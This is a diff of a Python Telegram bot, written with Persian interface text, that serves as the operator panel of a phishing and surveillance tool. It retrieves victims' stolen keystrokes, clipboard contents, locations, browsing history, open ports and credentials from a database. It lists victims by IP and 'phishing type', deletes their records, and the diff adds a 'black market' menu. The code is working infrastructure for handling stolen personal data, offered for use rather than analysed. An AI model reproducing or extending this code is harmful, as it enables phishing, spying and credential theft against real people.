+                if row: d = json.loads(row['data']); await query.message.reply_location(latitude=d['lat'], longitude=d['lng'])
+                else: await query.answer("موقعیت یافت نشد.", show_alert=True)
             elif action == "clipboard":
                 row = conn.execute("SELECT data FROM logs WHERE token=? AND type='clipboard' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
-                if row:
-                    d = json.loads(row['data'])
-                    await query.message.reply_text(f"📋 Clipboard: <code>{d['data']}</code>", parse_mode='HTML')
-                else:
-                    await query.answer("کلیپ‌بورد خالی.", show_alert=True)
+                if row: d = json.loads(row['data']); await query.message.reply_text(f"📋 Clipboard: <code>{d['data']}</code>", parse_mode='HTML')
+                else: await query.answer("کلیپ‌بورد خالی.", show_alert=True)
             elif action == "keystrokes":
                 rows = conn.execute("SELECT data FROM logs WHERE token=? AND type='keystrokes' ORDER BY timestamp ASC", (token,)).fetchall()
-                if rows:
-                    keys = ''.join([json.loads(r['data'])['data'] for r in rows])
-                    await query.message.reply_text(f"⌨️ Keystrokes: <code>{keys}</code>", parse_mode='HTML')
-                else:
-                    await query.answer("کی‌استروکی ثبت نشده.", show_alert=True)
+                if rows: keys = ''.join([json.loads(r['data'])['data'] for r in rows]); await query.message.reply_text(f"⌨️ Keystrokes: <code>{keys}</code>", parse_mode='HTML')
+                else: await query.answer("کی‌استروکی ثبت نشده.", show_alert=True)
             elif action == "ports":
                 rows = conn.execute("SELECT data FROM logs WHERE token=? AND type='open_port'", (token,)).fetchall()
-                if rows:
-                    ports = set([json.loads(r['data'])['port'] for r in rows])
-                    await query.message.reply_text(f"🔌 Open ports: {', '.join(map(str, ports))}")
-                else:
-                    await query.answer("پورت بازی یافت نشد.", show_alert=True)
+                if rows: ports = set([json.loads(r['data'])['port'] for r in rows]); await query.message.reply_text(f"🔌 Open ports: {', '.join(map(str, ports))}")
+                else: await query.answer("پورت بازی یافت نشد.", show_alert=True)
             elif action == "history":
                 rows = conn.execute("SELECT data FROM logs WHERE token=? AND type='history'", (token,)).fetchall()
-                if rows:
-                    hist = ', '.join([f"{json.loads(r['data'])['site']} ({json.loads(r['data'])['visited']})" for r in rows])
-                    await query.message.reply_text(f"🌐 Visited: {hist}")
-                else:
-                    await query.answer("تاریخچه‌ای یافت نشد.", show_alert=True)
+                if rows: hist = ', '.join([f"{json.loads(r['data'])['site']} ({json.loads(r['data'])['visited']})" for r in rows]); await query.message.reply_text(f"🌐 Visited: {hist}")
+                else: await query.answer("تاریخچه‌ای یافت نشد.", show_alert=True)
             conn.close()
 
         elif data.startswith("delete_victim|"):
-            if user_id != ADMIN_USER_ID:
-                await query.answer("⛔ اجازه ندارید", show_alert=True)
-                return
+            if user_id != ADMIN_USER_ID: return
             token = data.split("|")[1]
             conn = get_db_connection()
             conn.execute("DELETE FROM victims WHERE token=?", (token,))
             conn.execute("DELETE FROM logs WHERE token=?", (token,))
             conn.execute("DELETE FROM media WHERE token=?", (token,))
             conn.execute("DELETE FROM credentials WHERE token=?", (token,))
-            conn.commit()
-            conn.close()
-            await query.edit_message_text(f"🗑 قربانی {token} و تمام داده‌های مرتبط حذف شد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت به لیست", callback_data="victims_list")]]))
+            conn.commit(); conn.close()
+            await query.edit_message_text(f"🗑 قربانی {token} حذف شد.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="victims_list")]]))
 
         elif data == "start":
-            keyboard = [[InlineKeyboardButton("🔗 ساخت لینک جدید", callback_data="new_link")]]
-            if user_id == ADMIN_USER_ID:
-                keyboard.append([InlineKeyboardButton("⚙️ پنل مدیریت", callback_data="admin_panel")])
+            keyboard = [[InlineKeyboardButton("🔗 ساخت لینک جدید", callback_data="new_link")],
+                        [InlineKeyboardButton("👤 پروفایل", callback_data="profile"), InlineKeyboardButton("🛒 بازار سیاه", callback_data="market_menu")],
+                        [InlineKeyboardButton("📖 راهنما", callback_data="help")]]
+            if user_id == ADMIN_USER_ID: keyboard.append([InlineKeyboardButton("⚙️ پنل مدیریت", callback_data="admin_panel")])
             await query.edit_message_text("منوی اصلی:", reply_markup=InlineKeyboardMarkup(keyboard))
 
     except Exception as e:
@@ -1077,22 +1132,17 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def search_victim(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_USER_ID:
-        await update.message.reply_text("⛔ فقط مدیر می‌تواند جستجو کند.")
+        await update.message.reply_text("⛔ فقط مدیر.")
         return
     if not context.args:
-        await update.message.reply_text("لطفاً یک توکن وارد کنید: /search <token>")
+        await update.message.reply_text("📝 /search <token>")
         return
     token = context.args[0]
     conn = get_db_connection()
     victim = conn.execute("SELECT * FROM victims WHERE token=?", (token,)).fetchone()
     if victim:
-        text = f"<b>قربانی پیدا شد:</b>\n"
-        text += f"<b>توکن:</b> <code>{victim['token']}</code>\n"
-        text += f"<b>IP:</b> {victim['ip']}\n"
-        text += f"<b>آخرین فعالیت:</b> {victim['last_active']}\n"
-        text += f"<b>نوع فیشینگ:</b> {victim['phishing_type']}"
-        keyboard = [[InlineKeyboardButton("مشاهده جزئیات", callback_data=f"victim_detail|{token}")]]
-        await update.message.reply_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
+        text = f"<b>قربانی پیدا شد:</b>\n<b>توکن:</b> <code>{victim['token']}</code>\n<b>IP:</b> {victim['ip']}\n<b>آخرین فعالیت:</b> {victim['last_active']}\n<b>نوع فیشینگ:</b> {victim['phishing_type']}"
+        await update.message.reply_text(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("مشاهده جزئیات", callback_data=f"victim_detail|{token}")]]))
     else:
         await update.message.reply_text("قربانی با این توکن یافت نشد.")
     conn.close()
@@ -1114,7 +1164,9 @@ if __name__ == '__main__':
     application.add_handler(CommandHandler("wordlist", wordlist_command))
     application.add_handler(CommandHandler("stats", stats_command))
     application.add_handler(CommandHandler("broadcast", broadcast_command))
+    application.add_handler(CommandHandler("send", send_user_command))
     application.add_handler(CommandHandler("search", search_victim))
     application.add_handler(CallbackQueryHandler(button_handler))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    application.add_handler(MessageReactionHandler(handle_reaction))
     application.run_polling()
